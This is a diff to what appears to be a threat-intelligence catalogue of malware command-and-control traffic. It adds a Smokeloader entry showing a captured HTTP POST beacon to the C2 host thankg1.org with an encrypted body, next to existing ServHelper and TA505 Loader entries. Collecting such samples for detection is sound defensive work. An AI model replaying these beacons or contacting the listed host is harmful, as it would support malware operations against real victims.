@@ -232,6 +232,26 @@ key=%00%00%04%03%1B%00%1B&sysid=%06%1A%18%5EX%2B%3B%06%1A%08%00%03%1FOCL%3C%11%1
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/servhelper.png "ServHelper")
 
+#### Smokeloader
+~~~
+POST / HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Pragma: no-cache
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Referer: http://thankg1.org/
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
+Content-Length: 299
+Host: thankg1.org
+
+..ngl$j.N...$.=\..98h...8..XO.(3ET]...p1.Z.Q.....GI.1R..j6......NF`&....."5..V.~...#.,w......\N.V`.gI..0&.
+.N.Z...%.b.....V..3H....t..6w.....7.0..
+..+.........O..`...4..A..wT.F...XM&2.^.Y................E.4	W`.......(.....<,.zK..>c..^...p......n.z"]....\S,[.
+......qV4`..Pu*...8W.........M .h.v.S.:.
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")
+
 #### TA505 Loader:
 ~~~
 POST /2021 HTTP/1.1
